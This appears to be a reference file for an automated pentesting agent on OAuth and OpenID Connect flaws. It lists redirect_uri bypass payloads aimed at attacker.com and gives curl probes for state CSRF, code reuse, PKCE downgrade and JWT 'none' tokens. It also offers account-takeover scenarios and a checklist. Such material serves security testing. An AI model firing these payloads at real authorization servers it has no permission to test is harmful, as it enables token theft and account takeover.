---
vuln_type: oauth
severity: high
cwe: [CWE-346, CWE-601, CWE-285]
owasp: A07:2021-Identification-and-Authentication-Failures
related_tools: [curl, interactsh]
exploit_agent: auth_agent
tags: [oauth, oidc, authorization-code, implicit, pkce, token-theft, account-takeover, open-redirect, state, csrf]
---

# OAuth / OpenID Connect Vulnerabilities

## Overview
OAuth 2.0 is the standard authorization framework for third-party access. OpenID Connect (OIDC) adds authentication on top. Misconfigurations in OAuth flows lead to account takeover, token theft, and unauthorized access.

---

## OAuth 2.0 Flows

### Authorization Code Flow (most common for server-side apps)
```
1. User → App: "Login with Google"
2. App → Auth Server: /authorize?response_type=code&client_id=X&redirect_uri=CALLBACK&scope=openid&state=RANDOM
3. User authenticates at Auth Server
4. Auth Server → App (redirect): CALLBACK?code=AUTH_CODE&state=RANDOM
5. App → Auth Server (server-side): /token {code=AUTH_CODE, client_secret=SECRET}
6. Auth Server → App: {access_token, id_token, refresh_token}
```

### Implicit Flow (deprecated, still found)
```
1. App → Auth Server: /authorize?response_type=token&client_id=X&redirect_uri=CALLBACK
2. Auth Server → App (redirect): CALLBACK#access_token=TOKEN
   (Token in URL fragment — never sent to server, only accessible by JavaScript)
```

### Authorization Code + PKCE (mobile/SPA)
```
1. App generates code_verifier (random) and code_challenge = SHA256(code_verifier)
2. App → Auth Server: /authorize?...&code_challenge=X&code_challenge_method=S256
3. Auth Server → App: CALLBACK?code=AUTH_CODE
4. App → Auth Server: /token {code=AUTH_CODE, code_verifier=ORIGINAL}
5. Auth Server verifies SHA256(code_verifier) == code_challenge
```

---

## Vulnerability Categories

### 1. Improper redirect_uri Validation

**The most critical OAuth vulnerability.** If the attacker can control where the authorization code or token is sent, they can steal it.

**Testing:**
```
# Exact match bypass attempts
redirect_uri=https://attacker.com
redirect_uri=https://legit.com.attacker.com
redirect_uri=https://legit.com@attacker.com
redirect_uri=https://legit.com%40attacker.com
redirect_uri=https://attacker.com/legit.com
redirect_uri=https://attacker.com?.legit.com
redirect_uri=https://attacker.com#.legit.com

# Subdomain wildcarding
redirect_uri=https://evil.legit.com         (if *.legit.com is allowed)
redirect_uri=https://legit.com.evil.com

# Path traversal
redirect_uri=https://legit.com/callback/../../../attacker-path
redirect_uri=https://legit.com/callback/..%2f..%2fattacker

# Open redirect chaining
redirect_uri=https://legit.com/redirect?url=https://attacker.com

# Localhost/IP variations
redirect_uri=http://localhost
redirect_uri=http://127.0.0.1
redirect_uri=http://[::1]

# Scheme downgrade
redirect_uri=http://legit.com/callback    (http instead of https)

# Fragment injection
redirect_uri=https://legit.com/callback%23@attacker.com

# Parameter pollution
redirect_uri=https://legit.com/callback&redirect_uri=https://attacker.com
```

**Impact:** Authorization code or access token sent to attacker → account takeover.

### 2. Missing or Broken State Parameter (CSRF)

**No state parameter:**
```
# If /authorize request has no state parameter, attacker can:
# 1. Start OAuth flow, get their own auth code
# 2. Craft link: https://app.com/callback?code=ATTACKER_CODE
# 3. Victim clicks → victim's account linked to attacker's social account
# 4. Attacker logs in via social → access victim's account
```

**Testing:**
```bash
# Check if state is present
curl -I "https://app.com/login/google"
# Look for state= in the redirect URL

# Test if state is validated
# Complete flow normally, capture the callback
# Replay the callback with a different/missing state value
curl "https://app.com/callback?code=VALID_CODE"  # no state param
```

### 3. Authorization Code Reuse

```bash
# Capture a valid authorization code
# Try using it twice:
curl -X POST https://auth-server.com/token \
  -d "code=CAPTURED_CODE&client_id=X&client_secret=S&grant_type=authorization_code"
# If it works the second time → code reuse vulnerability
# OAuth spec requires codes to be single-use
```

### 4. Token Leakage via Referer Header

When the callback page has external links/resources:
```
# If redirect_uri page loads external resources (images, scripts, analytics)
# The Referer header will contain the full URL including ?code=AUTH_CODE
# Attacker controls an external resource loaded on the callback page
```

**Testing:**
- Inspect the callback page for external resource loads
- Check if `Referrer-Policy` header is set

### 5. Implicit Flow Token Theft

```
# Implicit flow puts token in URL fragment: #access_token=TOKEN
# If there's an open redirect on the callback page:
# 1. redirect_uri=https://legit.com/callback#/../redirect?url=https://attacker.com
# 2. Token fragment persists across redirects in some browsers
# 3. attacker.com receives the fragment via JavaScript

# Or: XSS on the callback domain can read location.hash
```

### 6. Scope Escalation

```bash
# Request more scope than intended
/authorize?...&scope=openid profile email admin

# Test if server ignores invalid scopes or grants them
# Try adding custom scopes that might exist:
scope=read write delete admin
scope=user:email user:admin
```

### 7. Client Secret Exposure

```bash
# Check JavaScript source for client_secret
# Check mobile app decompilation for client_secret
# If client_secret is exposed:
# 1. Attacker can exchange authorization codes for tokens
# 2. Attacker can impersonate the application

# Search in JS files:
grep -r "client_secret" *.js
# Check /api/ endpoints that proxy OAuth
```

### 8. PKCE Downgrade Attack

```bash
# If server supports both PKCE and non-PKCE:
# 1. Start flow WITHOUT code_challenge
# 2. If code is still issued → PKCE not enforced
# 3. Stolen code can be exchanged without code_verifier

/authorize?response_type=code&client_id=X&redirect_uri=CALLBACK
# (no code_challenge parameter)
```

### 9. Token in URL/Logs

```bash
# Check if access_token appears in URL (GET parameter instead of POST body or header)
# GET /api/data?access_token=TOKEN → logged in server logs, browser history, proxies
```

### 10. JWT Token Manipulation (if tokens are JWTs)

```bash
# Decode the token
echo "eyJ..." | base64 -d

# Check if algorithm can be changed
# See authentication_bypass.md for full JWT attacks

# Test "none" algorithm:
# Header: {"alg":"none","typ":"JWT"}
# Remove the signature
```

---

## OAuth Account Takeover Scenarios

### Scenario 1: Redirect URI → Open Redirect Chain
```
1. Find open redirect on legit.com: /redirect?url=ANYTHING
2. Use as redirect_uri:
   /authorize?...&redirect_uri=https://legit.com/redirect?url=https://attacker.com
3. Auth server validates legit.com domain ✓
4. Code sent to legit.com which redirects to attacker.com with code
5. Attacker exchanges code for token → account takeover
```

### Scenario 2: Missing State → OAuth CSRF
```
1. Attacker starts OAuth flow, gets code for their social account
2. Crafts URL: https://app.com/callback?code=ATTACKER_SOCIAL_CODE
3. Victim clicks → victim's app account now linked to attacker's social
4. Attacker logs in via "Login with Google" → accesses victim's account
```

### Scenario 3: Race Condition in Code Exchange
```
1. Capture authorization code
2. Race: exchange code before legitimate app does
3. If first exchange wins → attacker gets the token
```

---

## Testing Checklist

```
[ ] redirect_uri strictly validated? (exact match, no wildcards, no open redirect)
[ ] state parameter present and validated?
[ ] Authorization codes single-use?
[ ] PKCE enforced (not optional)?
[ ] Tokens not in URL parameters?
[ ] Referrer-Policy set on callback page?
[ ] client_secret not exposed in frontend code?
[ ] Scopes properly restricted?
[ ] Token expiration reasonable?
[ ] Refresh token rotation implemented?
[ ] Implicit flow disabled?
```

---

## Automated Testing

```bash
# Enumerate OAuth endpoints
curl -s https://target.com/.well-known/openid-configuration | python3 -m json.tool
curl -s https://target.com/.well-known/oauth-authorization-server | python3 -m json.tool

# Test redirect_uri validation
# Start auth flow with modified redirect_uri
curl -I "https://auth.target.com/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=https://attacker.com&scope=openid"

# Check for open redirect on callback domain
curl -I "https://target.com/redirect?url=https://attacker.com"

# Test state validation
curl "https://target.com/callback?code=VALID_CODE"  # without state

# Test code reuse
curl -X POST https://auth.target.com/token -d "code=CODE&client_id=X&client_secret=S&grant_type=authorization_code"
# Run same request again
```

---

## Output Interpretation

### Confirmed OAuth vulnerability indicators
- Redirect to attacker-controlled domain with `?code=` parameter
- Callback succeeds without state parameter
- Authorization code accepted twice
- Token returned in URL parameter visible in logs
- client_secret found in JavaScript source
- PKCE not enforced (flow works without code_challenge)

### Not vulnerable (false positives)
- redirect_uri rejected with error for all attacker-controlled domains
- State mismatch returns error
- Code exchange fails on second attempt
- Token only in response body (POST), never in URL

### Severity assessment
- **Critical**: redirect_uri bypass → code/token theft → account takeover
- **Critical**: Missing state + social login → CSRF account linking
- **High**: Client secret exposed + code interception possible
- **High**: Implicit flow still enabled with XSS on callback domain
- **Medium**: PKCE not enforced (requires network-level attacker)
- **Medium**: Token leakage via Referer (requires external resource on callback page)
- **Low**: Scope over-granting without sensitive data access
